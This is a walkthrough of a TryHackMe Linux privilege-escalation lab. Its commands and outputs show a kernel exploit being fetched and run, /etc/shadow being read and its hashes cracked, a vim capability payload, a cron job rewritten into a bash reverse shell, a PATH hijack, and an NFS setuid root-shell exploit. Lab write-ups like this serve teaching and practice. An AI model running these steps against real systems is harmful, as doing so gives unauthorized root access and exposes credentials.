# introduction

Privilege escalation is the act of exploiting a bug, a design flaw, or a configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user

# privileges escalation room of tryhackme

## task 0

### connect to thm network

```bash
openvpn username.ovpn
```

### connect using ssh to the machine

```bash
ssh karen@machine-address
then enter the password
```

## task 3 : Enumeration

### 1. What is the hostname of the target system : **wade3763**

```bash
uname -a
```

it prints system information

### 2. What is the Linux kernel version of the target system : **3.13.0-24-generic**

```bash
uname -a
```

it prints system information

### 3. What Linux is this : **Ubuntu 14.04 LTS**

```bash
cat /etc/issue
```

### 4. What version of the Python language is installed on the system :  2.7.6 

```bash
python --version
```


### 5.What vulnerability seem to affect the kernel of the target system (Enter a CVE number) : CVE-2015-1328

quick search on the internet with the kernel version of the machine

read about it [here](http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

## task 5 :  Privilege Escalation: Kernel Exploits

### What is the content of the flag1.txt file?

1. get the c file of the exploit from [here](https://www.exploit-db.com/exploits/37292) in your attacker machine

2. host a server using python 

```bash
python3 -m http.server 80
```

3. on the target machine get the file ofs.c (place yourself in tmp folder)

4. compile the file using gcc

5. execute the file and we are done :), we are root

```bash
$ cd /var/tmp/  
$ wget http://10.8.16.105/ofs.c 
--2022-09-01 12:47:12--  http://10.8.16.105/ofs.c
Connecting to 10.8.16.105:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3860 (3.8K) [text/x-csrc]
Saving to: ‘ofs.c’

100%[================================>] 3,860       --.-K/s   in 0s      

2022-09-01 12:47:12 (429 MB/s) - ‘ofs.c’ saved [3860/3860]

$ gcc ofs.c -o ofs
$ ./ofs          
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)

```

6. we get the flag1.txt now

```bash
# find / -name flag1.txt
/home/matt/flag1.txt
# cat /home/matt/flag1.txt
THM-28392872729920
```

## task 6: Sudo

### 1.How many programs can the user "karen" run on the target system with sudo rights : 3
```bash
$ sudo -l
Matching Defaults entries for karen on ip-10-10-193-45:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-193-45:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```
### 2. What is the content of the flag2.txt file?

```bash
$ find / -name flag2.txt 2> /dev/null 
/home/ubuntu/flag2.txt
$ cat /home/ubuntu/flag2.txt
THM-402028394
```

### 3. How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?
```
sudo nmap --interactive
```
read more [here](https://vk9-sec.com/nmap-privilege-escalation/)

### 4. What is the hash of frank's password
```
frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1
```

1. run **sudo nano** 
2. ctrl+R
3. /etc/shadow/
4. ctrl+X


## Task 7: Privilege Escalation: SUID

### 1. Which user shares the name of a great comic book writer?

just run 
```bash
cat /etc/passwd
```

### 2. What is the password of user2?

1. run the following command to find binaries with suid bit  at 1

```
find / -type f -perm -04000 -ls 2>/dev/null
```

2. if we search [here](https://gtfobins.github.io/#+suid) we can find that base64 is exploitable to read a file with root permision:

```
$ LFILE=/etc/shadow
$ base64 "$LFILE" | base64 --decode

```

3. we get the hash of user2 and we crack it using hashcat
```bash
hashcat -m 1800 -a 0 -o pass.txt hash.txt /usr/share/wordlists/rockyou.txt
```
 the answer is :Password1


### 3.What is the content of the flag3.txt file?

same as before we use base64 to cat the file:

```bash
$ LFILE=/home/ubuntu/flag3.txt             
$ base64 "$LFILE" | base64 --decode
THM-3847834
```


### Task 8: Capabilities

## 1. Complete the task described above on the target system

1. run **getcap -r / 2>/dev/null**

2. run the following payload
```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```


## 2. How many binaries have set capabilities : 6 

## 3. What other binary can be used through its capabilities : view 

## 4. What is the content of the flag4.txt file?
```bash
# find / -name flag4.txt
/home/ubuntu/flag4.txt
# cat /home/ubuntu/flag4.txt
THM-9349843
```

## Task 9: Cron Jobs

### How many user-defined cron jobs can you see on the target system : 4 
```bash
cat /etc/crontab
```
### What is the content of the flag5.txt file?

1. change the content of backup.sh to 
```bash
#!/bin/bash
bash -i >& /dev/tcp/ip/nc_port 0>&1
```
2. run a listener  on attcker machine

```bash
nc -lvnp  port
```

3. add execute to user on the victim machine

```bash
chmod +x backup.sh
```

4. and we are done, you will receive a root shell on your machine 


```bash
root@ip-10-10-2-27:~# find / -name flag5.txt
find / -name flag5.txt
/home/ubuntu/flag5.txt
root@ip-10-10-2-27:~# cat /home/ubuntu/flag5.txt
cat /home/ubuntu/flag5.txt
THM-383000283
```

### What is Matt's password: 123456

1. run **cat /etc/shadow**
2. get the hash of password and crackit with john


## Task 10: PATH 

### 1.What is the odd folder you have write access for : **home/murdoch**

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```


### 2. Exploit the $PATH vulnerability to read the content of the flag6.txt file.

1. find a binary with suid perm on the target
``` bash
find / -perm -u=s -type f 2>/dev/null
```

2. find the flag6.txt file
``` bash
$ find / -name flag6.txt 2>/dev/null
/home/matt/flag6.txt
```
3. create thm binary  in the /tmp folder  :

```bash
cat /home/matt/flag6.txt
```

4. add tmp folder to path:
```bash
export PATH=/tmp:$PATH
```
### 3. What is the content of the flag6.txt file?

- run the ./test file

```bash
$ ./test
THM-736628929
```

## Task 11: NFS

```bash
cat /etc/export
```

### 1. How many mountable shares can you identify on the target system?
3
### 2. How many shares have the "no_root_squash" option enabled?
3

### 3. Gain a root shell on the target system

1. get shared folder of the machine 
```bash
┌──(root㉿kali)-[/tmp]
└─# showmount -e 10.10.10.142
Export list for 10.10.10.142:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```

2. mount the first one
```bash
┌──(root㉿kali)-[/tmp]
└─# mount -o rw 10.10.10.142:/home/ubuntu/sharedfolder /tmp/shared
                                                                          
┌──(root㉿kali)-[/tmp]
└─# 
```

3. create exploit.c 
```c
int main(int argc, char const *argv[])
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

4. compile the code and add suid to the exe

5. run the exe on the target machine



### 4. What is the content of the flag7.txt file?

```bash
root@ip-10-10-10-142:/# find / -name flag7.txt
/home/matt/flag7.txt
root@ip-10-10-10-142:/# cat /home/matt/flag7.txt 
THM-89384012
```

























